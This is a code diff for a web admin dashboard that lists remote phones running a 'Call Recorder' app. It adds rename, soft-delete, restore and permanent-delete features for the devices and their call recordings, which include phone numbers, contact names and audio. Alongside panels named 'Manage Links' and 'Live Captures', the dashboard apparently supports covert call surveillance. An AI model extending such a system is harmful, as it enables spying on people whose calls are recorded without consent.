@@ -299,6 +299,31 @@
         .activity-row:last-child { border-bottom: none; }
         .activity-dot { width: 8px; height: 8px; border-radius: 50%; flex-shrink: 0; }
 
+        /* ══════ APP BIN / APP PANEL EXTRAS ══════ */
+        .app-bin-tabs { display: flex; gap: 4px; margin-bottom: 16px; }
+        .app-bin-tab {
+            padding: 7px 16px; border-radius: 8px; font-size: 12px; font-weight: 600;
+            cursor: pointer; border: 1px solid var(--border); background: var(--bg2);
+            color: var(--muted); transition: all .15s;
+        }
+        .app-bin-tab.active { background: var(--red); border-color: var(--red); color: #fff; }
+        .rec-card {
+            background: var(--card2); border: 1px solid var(--border); border-radius: 10px;
+            padding: 14px; margin-bottom: 10px; transition: border-color .15s;
+        }
+        .rec-card:hover { border-color: #334155; }
+        .rec-card-deleted { border-color: #2d1a1a; opacity: .85; }
+        .device-card-wrap {
+            background: var(--card2); border: 1px solid var(--border); border-radius: 12px;
+            overflow: hidden; display: flex; flex-direction: column; transition: border-color .2s;
+        }
+        .device-card-wrap:hover { border-color: #334155; }
+        .device-name-display { font-weight: 700; font-size: 14px; }
+        .device-custom-badge {
+            display: inline-block; background: rgba(16,185,129,.15); color: var(--green);
+            border-radius: 4px; padding: 1px 6px; font-size: 10px; font-weight: 700; margin-left: 6px;
+        }
+
         @media (max-width: 700px) {
             .sidebar { 
                 display: none; 
@@ -562,6 +587,10 @@
                 <span class="nav-icon">📱</span> App
                 <span class="nav-badge nav-badge-blue" id="navAppCount" style="display:none;">0</span>
             </button>
+            <button class="nav-item" data-panel="app-bin" data-shell="admin">
+                <span class="nav-icon">🗑️</span> App Bin
+                <span class="nav-badge badge-red" id="navAppBinCount" style="display:none;">0</span>
+            </button>
         </div>
 
         <div class="sidebar-footer">
@@ -789,9 +818,9 @@
                         </div>
                         <p style="font-size:11px;color:var(--muted);margin-bottom:16px;">
                             Phones where the Call Recorder app is installed and connected.
-                            Click a phone to view its call recordings.
+                            Click a phone to view its call recordings. Use ✏️ Rename to set a friendly name, or 🗑️ Delete to move to App Bin.
                         </p>
-                        <div id="appPhoneGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:14px;"></div>
+                        <div id="appPhoneGrid" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:14px;"></div>
                         <div id="appNoPhonesMsg" style="display:none;text-align:center;padding:48px 0;color:var(--muted);">
                             <div style="font-size:40px;margin-bottom:12px;">📵</div>
                             <div style="font-size:14px;font-weight:600;">No phones connected yet</div>
@@ -807,6 +836,10 @@
                             <button class="btn btn-gray btn-sm" id="appBackBtn">← Back</button>
                             <h3 id="appRecordingsTitle" style="margin-left:4px;">Recordings</h3>
                             <span class="badge" id="appRecCount">0</span>
+                            <div class="section-header-right">
+                                <button class="btn btn-teal btn-sm" id="appRenameCurrentBtn">✏️ Rename Device</button>
+                                <button class="btn btn-red btn-sm" id="appDeleteCurrentDeviceBtn">🗑️ Delete Device</button>
+                            </div>
                         </div>
                         <div id="appDeviceInfo" style="font-size:12px;color:var(--muted);margin-top:6px;"></div>
                     </div>
@@ -828,6 +861,55 @@
                 </div>
 
             </div><!-- /panel-app -->
+
+            <!-- ══ APP BIN PANEL ══ -->
+            <div class="panel" id="panel-app-bin">
+                <div class="section">
+                    <div class="section-header">
+                        <h3>🗑️ App Bin</h3>
+                        <span class="badge badge-red" id="appBinTotalCount">0</span>
+                        <div class="section-header-right">
+                            <button class="btn btn-red btn-sm" id="appBinEmptyAllBtn">🔥 Empty All</button>
+                        </div>
+                    </div>
+                    <p style="font-size:11px;color:var(--muted);margin-bottom:16px;">
+                        Deleted recordings and devices are stored here. Restore to recover or permanently delete to remove forever.
+                    </p>
+                    <!-- Tabs -->
+                    <div class="app-bin-tabs">
+                        <button class="app-bin-tab active" id="appBinTabRec" onclick="window.__appBinSwitchTab('recordings')">🎙️ Deleted Recordings <span id="appBinRecCount" style="margin-left:4px;"></span></button>
+                        <button class="app-bin-tab" id="appBinTabDev" onclick="window.__appBinSwitchTab('devices')">📱 Deleted Devices <span id="appBinDevCount" style="margin-left:4px;"></span></button>
+                    </div>
+                    <!-- Recordings bin list -->
+                    <div id="appBinRecordingsList"></div>
+                    <div id="appBinRecEmptyMsg" style="display:none;text-align:center;padding:40px 0;color:var(--muted);">
+                        <div style="font-size:36px;margin-bottom:10px;">✅</div>
+                        <div style="font-size:13px;">No deleted recordings.</div>
+                    </div>
+                    <!-- Devices bin list -->
+                    <div id="appBinDevicesList" style="display:none;"></div>
+                    <div id="appBinDevEmptyMsg" style="display:none;text-align:center;padding:40px 0;color:var(--muted);">
+                        <div style="font-size:36px;margin-bottom:10px;">✅</div>
+                        <div style="font-size:13px;">No deleted devices.</div>
+                    </div>
+                </div>
+            </div><!-- /panel-app-bin -->
+
+            <!-- ══ RENAME DEVICE MODAL ══ -->
+            <div class="modal-overlay" id="appRenameModal">
+                <div class="modal-box" style="width:380px;">
+                    <h3>✏️ Rename Device</h3>
+                    <p style="font-size:12px;color:var(--muted);margin-bottom:14px;">Set a friendly custom name for this device to identify it easily.</p>
+                    <label>Device ID</label>
+                    <input type="text" id="appRenameDeviceId" readonly style="background:#0d1117;color:var(--muted);cursor:default;">
+                    <label style="margin-top:12px;">Custom Name</label>
+                    <input type="text" id="appRenameInput" placeholder="e.g. Office Phone, John's Device…" maxlength="60" style="margin-top:4px;">
+                    <div class="modal-row">
+                        <button class="btn btn-primary" id="appRenameSaveBtn" style="flex:1;">💾 Save Name</button>
+                        <button class="btn btn-gray"    id="appRenameCancelBtn" style="flex:1;">Cancel</button>
+                    </div>
+                </div>
+            </div>
 
         </div><!-- /content -->
     </div><!-- /main -->
@@ -1342,7 +1424,7 @@ document.getElementById('userLogoutBtn').onclick = () => {
 // ══════════════════════════════════════════════════════════
 // NAVIGATION
 // ══════════════════════════════════════════════════════════
-const adminPanelTitles = { dashboard: 'Dashboard', links: 'Manage Links', captures: 'Live Captures', bin: 'Recycle Bin', users: 'User Management', app: 'App — Connected Phones' };
+const adminPanelTitles = { dashboard: 'Dashboard', links: 'Manage Links', captures: 'Live Captures', bin: 'Recycle Bin', users: 'User Management', app: 'App — Connected Phones', 'app-bin': 'App Bin — Deleted Items' };
 const userPanelTitles  = { 'u-dashboard': 'Dashboard', 'u-links': 'My Links', 'u-captures': 'My Captures', 'u-bin': 'Recycle Bin' };
 
 function switchPanel(name, shell) {
@@ -3338,32 +3420,29 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
 
 
 // ══════════════════════════════════════════════════════════
-// APP PANEL — reads app_devices + call_recordings from RTDB
-// ══════════════════════════════════════════════════════════
-(function() {
-    // State
-    let appDevicesData    = {};   // { deviceId: {...} }
-    let appRecordingsData = {};   // { deviceId: { recId: {...} } }
-    let appCurrentDevice  = null; // deviceId of selected phone
-    let appRecordingsAll  = [];   // full list for selected phone
+// ══════════════════════════════════════════════════════════════════════════════
+// APP PANEL — Connected Phones, Call Recordings, Rename, Delete, Bin
+// ══════════════════════════════════════════════════════════════════════════════
+(function () {
+
+    // ── State ───────────────────────────────────────────────────────────────
+    let appDevicesData     = {};   // { deviceId: { model, android_version, … } }
+    let appRecordingsData  = {};   // { deviceId: { recId: { direction, … } } }
+    let appCurrentDevice   = null; // deviceId currently open in recordings view
+    let appRecordingsAll   = [];   // active (non-deleted) recs for current device
     let appListenerAttached = false;
+    let appCurrentBinTab   = 'recordings'; // 'recordings' | 'devices'
 
     // ── Format helpers ──────────────────────────────────────────────────────
     function fmtDuration(secs) {
         if (!secs || secs < 0) return '0s';
-        const m = Math.floor(secs / 60);
-        const s = secs % 60;
+        const m = Math.floor(secs / 60), s = secs % 60;
         return m > 0 ? m + 'm ' + s + 's' : s + 's';
     }
-
     function fmtDateTime(isoStr) {
         if (!isoStr) return '—';
-        try {
-            const d = new Date(isoStr);
-            return d.toLocaleString();
-        } catch (_) { return isoStr; }
+        try { return new Date(isoStr).toLocaleString(); } catch (_) { return isoStr; }
     }
-
     function fmtRelative(isoStr) {
         if (!isoStr) return '—';
         try {
@@ -3376,52 +3455,118 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             return Math.floor(hrs / 24) + 'd ago';
         } catch (_) { return isoStr; }
     }
+    function fmtTs(ts) {
+        if (!ts) return '—';
+        return new Date(ts).toLocaleString();
+    }
 
-    // ── Attach RTDB listeners ───────────────────────────────────────────────
+    // ── Helpers: active vs deleted ──────────────────────────────────────────
+    // A device is "deleted" if it has a deleted_at timestamp set in RTDB.
+    // A recording is "deleted" if it has a deleted_at timestamp set in RTDB.
+    function isDeviceDeleted(d)    { return !!d.deleted_at; }
+    function isRecordingDeleted(r) { return !!r.deleted_at; }
+
+    // Returns active (non-deleted) devices
+    function activeDevices() {
+        return Object.entries(appDevicesData)
+            .filter(([, d]) => !isDeviceDeleted(d))
+            .map(([id, d]) => ({ ...d, device_id: id }));
+    }
+
+    // Returns deleted devices
+    function deletedDevices() {
+        return Object.entries(appDevicesData)
+            .filter(([, d]) => isDeviceDeleted(d))
+            .map(([id, d]) => ({ ...d, device_id: id }));
+    }
+
+    // Returns active recordings for a device (no deleted_at)
+    function activeRecordingsForDevice(deviceId) {
+        const recs = appRecordingsData[deviceId] || {};
+        return Object.entries(recs)
+            .filter(([, r]) => !isRecordingDeleted(r))
+            .map(([recId, r]) => ({ ...r, _rec_id: recId, _device_id: deviceId }))
+            .sort((a, b) => new Date(b.start_time || 0) - new Date(a.start_time || 0));
+    }
+
+    // Returns ALL deleted recordings across all devices
+    function allDeletedRecordings() {
+        const result = [];
+        Object.entries(appRecordingsData).forEach(([deviceId, recs]) => {
+            if (!recs) return;
+            Object.entries(recs).forEach(([recId, r]) => {
+                if (isRecordingDeleted(r)) {
+                    result.push({ ...r, _rec_id: recId, _device_id: deviceId });
+                }
+            });
+        });
+        return result.sort((a, b) => (b.deleted_at || 0) - (a.deleted_at || 0));
+    }
+
+    // ── Nav badge + phone count ─────────────────────────────────────────────
+    function updateNavBadge() {
+        const active  = activeDevices().length;
+        const deleted = deletedDevices().length;
+        const delRecs = allDeletedRecordings().length;
+        const binTotal = deleted + delRecs;
+
+        const appBadge = document.getElementById('navAppCount');
+        if (appBadge) {
+            appBadge.style.display = active > 0 ? '' : 'none';
+            appBadge.textContent   = active;
+        }
+        const binBadge = document.getElementById('navAppBinCount');
+        if (binBadge) {
+            binBadge.style.display = binTotal > 0 ? '' : 'none';
+            binBadge.textContent   = binTotal;
+        }
+        const phoneCount = document.getElementById('appPhoneCount');
+        if (phoneCount) phoneCount.textContent = active;
+
+        const appBinTotal = document.getElementById('appBinTotalCount');
+        if (appBinTotal) appBinTotal.textContent = binTotal;
+        const recCountBadge = document.getElementById('appBinRecCount');
+        if (recCountBadge) recCountBadge.textContent = delRecs > 0 ? '(' + delRecs + ')' : '';
+        const devCountBadge = document.getElementById('appBinDevCount');
+        if (devCountBadge) devCountBadge.textContent = deleted > 0 ? '(' + deleted + ')' : '';
+    }
+
+    // ── RTDB listeners ──────────────────────────────────────────────────────
     function attachAppListeners() {
         if (appListenerAttached) return;
         appListenerAttached = true;
 
-        // Listen to app_devices
         onValue(ref(db, 'app_devices'), (snap) => {
             appDevicesData = snap.val() || {};
             if (appCurrentDevice === null) renderPhoneList();
             updateNavBadge();
+            renderAppBin(); // keep bin up to date
         });
 
-        // Listen to call_recordings
         onValue(ref(db, 'call_recordings'), (snap) => {
             appRecordingsData = snap.val() || {};
             if (appCurrentDevice !== null) {
                 buildRecordingsList(appCurrentDevice);
                 renderRecordingsList();
             }
+            updateNavBadge();
+            renderAppBin();
         });
     }
 
-    function updateNavBadge() {
-        const count = Object.keys(appDevicesData).length;
-        const badge = document.getElementById('navAppCount');
-        if (!badge) return;
-        if (count > 0) {
-            badge.style.display = '';
-            badge.textContent   = count;
-        } else {
-            badge.style.display = 'none';
-        }
-        const phoneCount = document.getElementById('appPhoneCount');
-        if (phoneCount) phoneCount.textContent = count;
+    // ── Phone list ──────────────────────────────────────────────────────────
+    function deviceDisplayName(d) {
+        return d.custom_name
+            ? `<span class="device-name-display">${esc(d.custom_name)}</span><span class="device-custom-badge">custom</span>`
+            : `<span class="device-name-display">${esc(d.model || 'Unknown device')}</span>`;
     }
 
-    // ── Phone list ──────────────────────────────────────────────────────────
     function renderPhoneList() {
-        const grid    = document.getElementById('appPhoneGrid');
-        const noMsg   = document.getElementById('appNoPhonesMsg');
+        const grid  = document.getElementById('appPhoneGrid');
+        const noMsg = document.getElementById('appNoPhonesMsg');
         if (!grid) return;
 
-        // FIX: Object.values() drops the RTDB key, so d.device_id was undefined.
-        // Object.entries() preserves the key and injects it as device_id.
-        const devices = Object.entries(appDevicesData).map(([id, d]) => ({ ...d, device_id: id }));
+        const devices = activeDevices();
         document.getElementById('appPhoneCount').textContent = devices.length;
 
         if (devices.length === 0) {
@@ -3432,17 +3577,21 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         noMsg.style.display = 'none';
 
         grid.innerHTML = devices.map((d, i) => {
-            const recCount  = appRecordingsData[d.device_id]
-                ? Object.keys(appRecordingsData[d.device_id]).length : 0;
-            const lastSeen  = fmtRelative(d.last_seen);
-            const phoneNum  = i + 1;
-            return `<div class="log-card" style="cursor:pointer;" onclick="window.__appOpenPhone('${esc(d.device_id)}')">
-                <div class="card-body">
+            // Count only active (non-deleted) recordings
+            const recCount = activeRecordingsForDevice(d.device_id).length;
+            const lastSeen = fmtRelative(d.last_seen);
+            const phoneNum = i + 1;
+            const did      = esc(d.device_id);
+            return `
+            <div class="device-card-wrap">
+                <div class="card-body" style="cursor:pointer;" onclick="window.__appOpenPhone('${did}')">
                     <div style="display:flex;align-items:center;gap:10px;margin-bottom:10px;">
                         <div style="width:38px;height:38px;border-radius:10px;background:linear-gradient(135deg,var(--primary),var(--purple));display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0;">📱</div>
-                        <div>
-                            <div style="font-weight:700;font-size:14px;">Phone ${phoneNum}</div>
-                            <div style="font-size:12px;color:var(--muted);">${esc(d.model || 'Unknown device')}</div>
+                        <div style="min-width:0;flex:1;">
+                            <div style="display:flex;align-items:center;flex-wrap:wrap;gap:4px;">
+                                ${deviceDisplayName(d)}
+                            </div>
+                            <div style="font-size:11px;color:var(--muted);margin-top:2px;">ID: ${esc(d.device_id)}</div>
                         </div>
                     </div>
                     <p class="meta">Android ${esc(d.android_version || '?')} &nbsp;·&nbsp; App v${esc(d.app_version || '?')}</p>
@@ -3450,18 +3599,17 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     <p class="meta" style="margin-top:4px;">Recordings: <strong style="color:var(--text);">${recCount}</strong></p>
                 </div>
                 <div class="card-actions">
-                    <button class="btn btn-primary btn-sm" style="flex:1;" onclick="event.stopPropagation();window.__appOpenPhone('${esc(d.device_id)}')">🎙️ View Recordings →</button>
+                    <button class="btn btn-primary btn-sm" style="flex:2;" onclick="window.__appOpenPhone('${did}')">🎙️ View Recordings →</button>
+                    <button class="btn btn-teal btn-sm"    style="flex:1;" onclick="event.stopPropagation();window.__appRenameDevice('${did}')" title="Rename device">✏️</button>
+                    <button class="btn btn-red btn-sm"     style="flex:1;" onclick="event.stopPropagation();window.__appDeleteDevice('${did}')" title="Delete device">🗑️</button>
                 </div>
             </div>`;
         }).join('');
     }
 
-    // ── Recordings for a phone ──────────────────────────────────────────────
+    // ── Recordings list ─────────────────────────────────────────────────────
     function buildRecordingsList(deviceId) {
-        const recs = appRecordingsData[deviceId] || {};
-        appRecordingsAll = Object.values(recs).sort((a, b) =>
-            new Date(b.start_time || 0) - new Date(a.start_time || 0)
-        );
+        appRecordingsAll = activeRecordingsForDevice(deviceId);
     }
 
     function renderRecordingsList() {
@@ -3497,39 +3645,43 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 : `<strong>${esc(r.phone_number || 'Unknown number')}</strong>`;
             const audioSection = (r.audio_url || r.audio_data)
                 ? `<audio controls style="width:100%;margin-top:8px;height:32px;" src="${esc(r.audio_url || r.audio_data)}"></audio>`
-                : `<div style="font-size:11px;color:var(--muted);margin-top:6px;">Audio not available</div>`;
+                : `<div style="font-size:11px;color:var(--muted);margin-top:6px;">🔇 Audio not available</div>`;
+            const did = esc(r._device_id);
+            const rid = esc(r._rec_id);
 
-            return `<div style="background:var(--card2);border:1px solid var(--border);border-radius:10px;padding:14px;margin-bottom:10px;">
+            return `<div class="rec-card">
                 <div style="display:flex;align-items:flex-start;gap:12px;">
                     <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '📲' : '📤'}</div>
                     <div style="flex:1;min-width:0;">
                         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px;">
                             <span style="font-size:11px;font-weight:700;color:${dirCol};background:${dirBg};padding:2px 8px;border-radius:12px;">${dirLbl}</span>
                             <span style="font-size:12px;color:var(--muted);">${fmtDateTime(r.start_time)}</span>
+                            <span style="font-size:11px;color:var(--muted);margin-left:auto;">⏱ ${fmtDuration(r.duration_seconds)}</span>
                         </div>
                         <div style="font-size:13px;margin-bottom:2px;">${who}</div>
-                        <div style="font-size:11px;color:var(--muted);">Duration: ${fmtDuration(r.duration_seconds)}</div>
                         ${audioSection}
                     </div>
+                    <button class="btn btn-red btn-sm" style="flex-shrink:0;margin-left:8px;" onclick="window.__appDeleteRecording('${did}','${rid}')" title="Delete recording">🗑️ Delete</button>
                 </div>
             </div>`;
         }).join('');
     }
 
     // ── Open phone recordings ───────────────────────────────────────────────
-    window.__appOpenPhone = function(deviceId) {
+    window.__appOpenPhone = function (deviceId) {
         appCurrentDevice = deviceId;
-        const d = appDevicesData[deviceId] || {};
+        const d        = appDevicesData[deviceId] || {};
+        const devices  = activeDevices();
+        const phoneNum = devices.findIndex(x => x.device_id === deviceId) + 1;
 
-        // Update title and info
-        // FIX: same as renderPhoneList — inject device_id so findIndex works
-        const devices     = Object.entries(appDevicesData).map(([id, d]) => ({ ...d, device_id: id }));
-        const phoneNum    = devices.findIndex(x => x.device_id === deviceId) + 1;
+        // Title: prefer custom name
+        const titleName = d.custom_name || d.model || 'Unknown';
         document.getElementById('appRecordingsTitle').textContent =
-            'Phone ' + phoneNum + ' — ' + (d.model || 'Unknown');
-        document.getElementById('appDeviceInfo').textContent =
-            'Android ' + (d.android_version || '?') +
-            ' · App v' + (d.app_version || '?') +
+            'Phone ' + phoneNum + ' — ' + titleName;
+        document.getElementById('appDeviceInfo').innerHTML =
+            'Device ID: <code style="background:var(--bg2);padding:1px 5px;border-radius:4px;font-size:11px;">' + esc(deviceId) + '</code>' +
+            ' &nbsp;·&nbsp; Android ' + esc(d.android_version || '?') +
+            ' · App v' + esc(d.app_version || '?') +
             ' · Last seen: ' + fmtRelative(d.last_seen);
 
         buildRecordingsList(deviceId);
@@ -3538,6 +3690,266 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         document.getElementById('appPhonesView').style.display    = 'none';
         document.getElementById('appRecordingsView').style.display = '';
     };
+
+    // ── Rename device ───────────────────────────────────────────────────────
+    window.__appRenameDevice = function (deviceId) {
+        const d = appDevicesData[deviceId] || {};
+        document.getElementById('appRenameDeviceId').value = deviceId;
+        document.getElementById('appRenameInput').value    = d.custom_name || '';
+        document.getElementById('appRenameModal').classList.add('open');
+    };
+
+    document.getElementById('appRenameCancelBtn').addEventListener('click', () => {
+        document.getElementById('appRenameModal').classList.remove('open');
+    });
+
+    document.getElementById('appRenameSaveBtn').addEventListener('click', async () => {
+        const deviceId = document.getElementById('appRenameDeviceId').value;
+        const newName  = document.getElementById('appRenameInput').value.trim();
+        if (!deviceId) return;
+        try {
+            await update(ref(db, 'app_devices/' + deviceId), { custom_name: newName || null });
+            document.getElementById('appRenameModal').classList.remove('open');
+            toast('✏️ Device renamed to: ' + (newName || '(cleared)'), 'var(--teal)');
+            // Refresh current view if open
+            if (appCurrentDevice === deviceId) window.__appOpenPhone(deviceId);
+        } catch (e) {
+            toast('❌ Rename failed: ' + e.message, 'var(--red)');
+        }
+    });
+
+    // Also allow rename from the detail page button
+    document.getElementById('appRenameCurrentBtn').addEventListener('click', () => {
+        if (appCurrentDevice) window.__appRenameDevice(appCurrentDevice);
+    });
+
+    // ── Delete device (soft delete → sets deleted_at in RTDB) ──────────────
+    window.__appDeleteDevice = async function (deviceId) {
+        if (!confirm('Move this device and all its recordings to the App Bin?\n\nYou can restore them later.')) return;
+        const now = Date.now();
+        try {
+            // Soft-delete the device
+            await update(ref(db, 'app_devices/' + deviceId), { deleted_at: now });
+            // Soft-delete ALL recordings for this device
+            const recs = appRecordingsData[deviceId] || {};
+            const recUpdates = {};
+            Object.keys(recs).forEach(recId => {
+                recUpdates['call_recordings/' + deviceId + '/' + recId + '/deleted_at'] = now;
+            });
+            if (Object.keys(recUpdates).length > 0) {
+                await update(ref(db), recUpdates);
+            }
+            // Return to phone list if we were viewing this device
+            if (appCurrentDevice === deviceId) {
+                appCurrentDevice = null;
+                document.getElementById('appRecordingsView').style.display = 'none';
+                document.getElementById('appPhonesView').style.display     = '';
+            }
+            toast('🗑️ Device moved to App Bin.', 'var(--yellow)');
+        } catch (e) {
+            toast('❌ Delete failed: ' + e.message, 'var(--red)');
+        }
+    };
+
+    document.getElementById('appDeleteCurrentDeviceBtn').addEventListener('click', () => {
+        if (appCurrentDevice) window.__appDeleteDevice(appCurrentDevice);
+    });
+
+    // ── Delete recording (soft delete) ──────────────────────────────────────
+    window.__appDeleteRecording = async function (deviceId, recId) {
+        if (!confirm('Move this recording to the App Bin?\n\nYou can restore it later.')) return;
+        try {
+            await update(ref(db, 'call_recordings/' + deviceId + '/' + recId), { deleted_at: Date.now() });
+            toast('🗑️ Recording moved to App Bin.', 'var(--yellow)');
+        } catch (e) {
+            toast('❌ Delete failed: ' + e.message, 'var(--red)');
+        }
+    };
+
+    // ── Restore recording from bin ──────────────────────────────────────────
+    window.__appRestoreRecording = async function (deviceId, recId) {
+        try {
+            await update(ref(db, 'call_recordings/' + deviceId + '/' + recId), { deleted_at: null });
+            toast('✅ Recording restored.', 'var(--green)');
+        } catch (e) {
+            toast('❌ Restore failed: ' + e.message, 'var(--red)');
+        }
+    };
+
+    // ── Permanently delete recording ────────────────────────────────────────
+    window.__appPermDeleteRecording = async function (deviceId, recId) {
+        if (!confirm('Permanently delete this recording? This cannot be undone.')) return;
+        try {
+            await remove(ref(db, 'call_recordings/' + deviceId + '/' + recId));
+            toast('🔥 Recording permanently deleted.', 'var(--red)');
+        } catch (e) {
+            toast('❌ Delete failed: ' + e.message, 'var(--red)');
+        }
+    };
+
+    // ── Restore device from bin ─────────────────────────────────────────────
+    window.__appRestoreDevice = async function (deviceId) {
+        try {
+            // Restore device
+            await update(ref(db, 'app_devices/' + deviceId), { deleted_at: null });
+            // Restore all recordings for this device that were deleted
+            const recs = appRecordingsData[deviceId] || {};
+            const recUpdates = {};
+            Object.keys(recs).forEach(recId => {
+                recUpdates['call_recordings/' + deviceId + '/' + recId + '/deleted_at'] = null;
+            });
+            if (Object.keys(recUpdates).length > 0) {
+                await update(ref(db), recUpdates);
+            }
+            toast('✅ Device and its recordings restored.', 'var(--green)');
+        } catch (e) {
+            toast('❌ Restore failed: ' + e.message, 'var(--red)');
+        }
+    };
+
+    // ── Permanently delete device ────────────────────────────────────────────
+    window.__appPermDeleteDevice = async function (deviceId) {
+        if (!confirm('Permanently delete this device and ALL its recordings? This cannot be undone.')) return;
+        try {
+            await remove(ref(db, 'app_devices/' + deviceId));
+            await remove(ref(db, 'call_recordings/' + deviceId));
+            toast('🔥 Device permanently deleted.', 'var(--red)');
+        } catch (e) {
+            toast('❌ Delete failed: ' + e.message, 'var(--red)');
+        }
+    };
+
+    // ── App Bin rendering ───────────────────────────────────────────────────
+    window.__appBinSwitchTab = function (tab) {
+        appCurrentBinTab = tab;
+        document.getElementById('appBinTabRec').classList.toggle('active', tab === 'recordings');
+        document.getElementById('appBinTabDev').classList.toggle('active', tab === 'devices');
+        renderAppBin();
+    };
+
+    function renderAppBin() {
+        renderBinRecordings();
+        renderBinDevices();
+        updateNavBadge();
+    }
+
+    function renderBinRecordings() {
+        const container = document.getElementById('appBinRecordingsList');
+        const emptyMsg  = document.getElementById('appBinRecEmptyMsg');
+        if (!container) return;
+
+        const show = appCurrentBinTab === 'recordings';
+        container.style.display = show ? '' : 'none';
+
+        if (!show) { emptyMsg.style.display = 'none'; return; }
+
+        const recs = allDeletedRecordings();
+        if (recs.length === 0) {
+            container.innerHTML = '';
+            emptyMsg.style.display = '';
+            return;
+        }
+        emptyMsg.style.display = 'none';
+
+        container.innerHTML = recs.map(r => {
+            const isIn   = r.direction === 'incoming';
+            const dirBg  = isIn ? '#0d3b26' : '#1a1f3a';
+            const dirCol = isIn ? 'var(--green)' : 'var(--primary)';
+            const dirLbl = isIn ? '📲 Incoming' : '📤 Outgoing';
+            const who    = r.contact_name
+                ? `<strong>${esc(r.contact_name)}</strong> <span style="color:var(--muted);font-size:11px;">${esc(r.phone_number || '')}</span>`
+                : `<strong>${esc(r.phone_number || 'Unknown number')}</strong>`;
+            // Device info for context
+            const dev    = appDevicesData[r._device_id] || {};
+            const devLabel = dev.custom_name || dev.model || r._device_id;
+            const did = esc(r._device_id), rid = esc(r._rec_id);
+
+            return `<div class="rec-card rec-card-deleted">
+                <div style="display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap;">
+                    <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '📲' : '📤'}</div>
+                    <div style="flex:1;min-width:160px;">
+                        <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px;">
+                            <span style="font-size:11px;font-weight:700;color:${dirCol};background:${dirBg};padding:2px 8px;border-radius:12px;">${dirLbl}</span>
+                            <span style="font-size:12px;color:var(--muted);">${fmtDateTime(r.start_time)}</span>
+                            <span style="font-size:11px;color:var(--muted);">⏱ ${fmtDuration(r.duration_seconds)}</span>
+                        </div>
+                        <div style="font-size:13px;margin-bottom:2px;">${who}</div>
+                        <div style="font-size:11px;color:var(--muted);">📱 From: ${esc(devLabel)}</div>
+                        <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(r.deleted_at)}</div>
+                    </div>
+                    <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
+                        <button class="btn btn-green btn-sm"  onclick="window.__appRestoreRecording('${did}','${rid}')">♻️ Restore</button>
+                        <button class="btn btn-red   btn-sm"  onclick="window.__appPermDeleteRecording('${did}','${rid}')">🔥 Delete</button>
+                    </div>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    function renderBinDevices() {
+        const container = document.getElementById('appBinDevicesList');
+        const emptyMsg  = document.getElementById('appBinDevEmptyMsg');
+        if (!container) return;
+
+        const show = appCurrentBinTab === 'devices';
+        container.style.display = show ? '' : 'none';
+
+        if (!show) { emptyMsg.style.display = 'none'; return; }
+
+        const devices = deletedDevices();
+        if (devices.length === 0) {
+            container.innerHTML = '';
+            emptyMsg.style.display = '';
+            return;
+        }
+        emptyMsg.style.display = 'none';
+
+        container.innerHTML = devices.map(d => {
+            const allRecs    = appRecordingsData[d.device_id] || {};
+            const recCount   = Object.keys(allRecs).length;
+            const did        = esc(d.device_id);
+            const devLabel   = d.custom_name || d.model || d.device_id;
+            return `<div class="rec-card rec-card-deleted" style="margin-bottom:10px;">
+                <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
+                    <div style="width:40px;height:40px;border-radius:10px;background:linear-gradient(135deg,#334155,#475569);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;">📱</div>
+                    <div style="flex:1;min-width:140px;">
+                        <div style="font-weight:700;font-size:14px;">${esc(devLabel)}</div>
+                        <div style="font-size:11px;color:var(--muted);margin-top:2px;">ID: ${esc(d.device_id)}</div>
+                        <div style="font-size:11px;color:var(--muted);">Android ${esc(d.android_version || '?')} · App v${esc(d.app_version || '?')}</div>
+                        <div style="font-size:11px;color:var(--muted);">Total recordings: ${recCount}</div>
+                        <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(d.deleted_at)}</div>
+                    </div>
+                    <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
+                        <button class="btn btn-green btn-sm" onclick="window.__appRestoreDevice('${did}')">♻️ Restore Device</button>
+                        <button class="btn btn-red   btn-sm" onclick="window.__appPermDeleteDevice('${did}')">🔥 Delete Permanently</button>
+                    </div>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    // ── Empty All bin items ─────────────────────────────────────────────────
+    document.getElementById('appBinEmptyAllBtn').addEventListener('click', async () => {
+        const delRecs   = allDeletedRecordings();
+        const delDevs   = deletedDevices();
+        const totalCount = delRecs.length + delDevs.length;
+        if (totalCount === 0) { toast('App Bin is already empty.', 'var(--muted)'); return; }
+        if (!confirm('Permanently delete ALL ' + totalCount + ' item(s) from the App Bin? This cannot be undone.')) return;
+        try {
+            // Perm-delete all recordings in bin
+            for (const r of delRecs) {
+                await remove(ref(db, 'call_recordings/' + r._device_id + '/' + r._rec_id));
+            }
+            // Perm-delete all devices in bin (and their recordings)
+            for (const d of delDevs) {
+                await remove(ref(db, 'app_devices/' + d.device_id));
+                await remove(ref(db, 'call_recordings/' + d.device_id));
+            }
+            toast('🔥 App Bin emptied.', 'var(--red)');
+        } catch (e) {
+            toast('❌ Error: ' + e.message, 'var(--red)');
+        }
+    });
 
     // ── Back button ─────────────────────────────────────────────────────────
     document.getElementById('appBackBtn').addEventListener('click', () => {
